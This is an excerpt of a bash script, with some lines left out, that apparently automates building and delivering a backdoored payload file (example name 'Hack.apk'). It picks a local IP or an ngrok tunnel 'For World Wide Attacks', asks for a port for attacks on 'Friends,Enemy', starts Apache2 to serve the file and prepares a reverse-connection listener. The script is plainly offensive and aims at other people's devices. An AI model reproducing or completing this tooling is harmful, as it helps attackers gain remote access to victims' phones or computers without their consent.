...
if [ $Address -eq 1 ]
then
echo "\n\e[91m[*] \e[96mAutomatically Local Host Selected In 3 Seconds..!\e[0m"
sleep 3
LHO=$(ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{ print $2}')
echo "\n\e[91m[*] \e[96mYour Local Host is $LHO \e[0m"
echo "\n\e[91m[*] \e[96mEnter Local Port(For Local Attacks.. Like Friends,Enemy):\e[5m_\e[0m"
read LPO
break;
elif [ $Address -eq 2 ]
then
echo "\n\e[91m[*] \e[96mOpen a New Terminal And Type ngrok tcp 22 or ngrok (Whatever Protocol) (Port You Want To Give):\e[5m_\e[0m"
echo "\n\e[91m[*] \e[96mYou Have 30 Seconds To Do It\e[5m_\e[0m"
sleep 30
echo "\n\e[91m[*] \e[96mEnter Ngrok's Address Here:(****.ngrok.io --> Address Here)\e[5m_\e[0m"
read LHO
echo "\n\e[91m[*] \e[96mEnter Ngrok's Local Port Here:(For World Wide Attacks..):\e[5m_\e[0m"
read LPO
break;
else
echo "\n\e[91m[*] \e[96mGiven Number is Not Valid\e[0m"
...
echo "\n\e[91m[*] \e[96mEnter File_Name.File_Format:(Ex: Hack.apk)\e[5m_\e[0m"
read FIL
CUD=$(pwd)
...
then
{
echo "\n\e[91m[*] \e[96mStarting Apache2 Web Server in 5 Seconds:\e[5m_\e[0m"
sleep 5
...
echo "\n\t\e[91m[*] \e[96mLocal Host:\t\e[5m\e[93m$LHO\e[0m" 
echo "\n\t\e[91m[*] \e[96mLocal Port:\t\e[5m\e[93m$LPO\e[0m"
echo "\n\e[91m[*] \e[96mStarting To Create Listener in 5 Sec\e[5m_\e[0m"
